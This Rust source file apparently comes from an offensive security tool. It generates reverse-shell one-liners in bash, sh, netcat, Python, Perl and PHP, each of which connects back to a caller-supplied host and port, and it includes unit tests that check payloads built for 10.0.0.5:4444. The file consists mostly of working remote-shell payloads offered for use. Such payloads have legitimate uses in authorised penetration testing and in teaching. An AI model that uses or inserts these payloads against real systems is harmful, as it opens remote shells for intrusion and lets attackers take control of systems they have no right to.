// Payload one-liner generator. Public, well-known reverse-shell snippets.
// Output goes to stdout so it can be piped into another tool or pasted
// into a `breakout --command` argument.

#[derive(Debug, Clone)]
pub struct PayloadReport {
    pub kind: String,
    pub lang: String,
    pub to: String,
    pub payload: String,
}

#[derive(Debug, Clone, Copy)]
pub struct PayloadOptions<'a> {
    pub kind: &'a str,
    pub lang: &'a str,
    pub to: Option<&'a str>,
}

pub fn generate(opts: PayloadOptions<'_>) -> Result<PayloadReport, String> {
    if opts.kind != "reverse-shell" {
        return Err(format!(
            "unknown payload kind '{}' — supported: reverse-shell",
            opts.kind
        ));
    }
    let Some(to) = opts.to else {
        return Err("--to HOST:PORT is required for reverse-shell".to_string());
    };
    let (host, port) = parse_to(to)?;
    let payload = match opts.lang {
        "bash" => format!("bash -i >& /dev/tcp/{host}/{port} 0>&1"),
        "sh" => format!(
            "sh -i 5<> /dev/tcp/{host}/{port} 0<&5 1>&5 2>&5"
        ),
        "nc" => format!("rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f|/bin/sh -i 2>&1|nc {host} {port} >/tmp/f"),
        "python" => format!(
            "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"{host}\",{port}));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/sh\")'"
        ),
        "perl" => format!(
            "perl -e 'use Socket;$i=\"{host}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'"
        ),
        "php" => format!(
            "php -r '$sock=fsockopen(\"{host}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        ),
        other => {
            return Err(format!(
                "unknown lang '{other}' — supported: bash, sh, nc, python, perl, php"
            ));
        }
    };
    Ok(PayloadReport {
        kind: opts.kind.to_string(),
        lang: opts.lang.to_string(),
        to: to.to_string(),
        payload,
    })
}

fn parse_to(value: &str) -> Result<(&str, &str), String> {
    let (host, port) = value
        .rsplit_once(':')
        .ok_or_else(|| format!("invalid --to '{value}', expected HOST:PORT"))?;
    if host.is_empty() || port.is_empty() {
        return Err(format!("invalid --to '{value}', expected HOST:PORT"));
    }
    if port.parse::<u16>().is_err() {
        return Err(format!("invalid port in --to '{value}'"));
    }
    Ok((host, port))
}

#[cfg(test)]
mod tests {
    use super::*;

    fn opts<'a>(lang: &'a str, to: &'a str) -> PayloadOptions<'a> {
        PayloadOptions {
            kind: "reverse-shell",
            lang,
            to: Some(to),
        }
    }

    #[test]
    fn rejects_unknown_kind() {
        assert!(generate(PayloadOptions {
            kind: "shell",
            lang: "bash",
            to: Some("a:1"),
        })
        .is_err());
    }

    #[test]
    fn requires_to() {
        assert!(generate(PayloadOptions {
            kind: "reverse-shell",
            lang: "bash",
            to: None,
        })
        .is_err());
    }

    #[test]
    fn invalid_port_rejected() {
        assert!(generate(opts("bash", "host:notaport")).is_err());
    }

    #[test]
    fn generates_bash_oneliner() {
        let report = generate(opts("bash", "10.0.0.5:4444")).unwrap();
        assert!(report.payload.contains("/dev/tcp/10.0.0.5/4444"));
    }

    #[test]
    fn generates_python_oneliner() {
        let report = generate(opts("python", "10.0.0.5:4444")).unwrap();
        assert!(report.payload.contains("10.0.0.5"));
        assert!(report.payload.contains("4444"));
    }
}
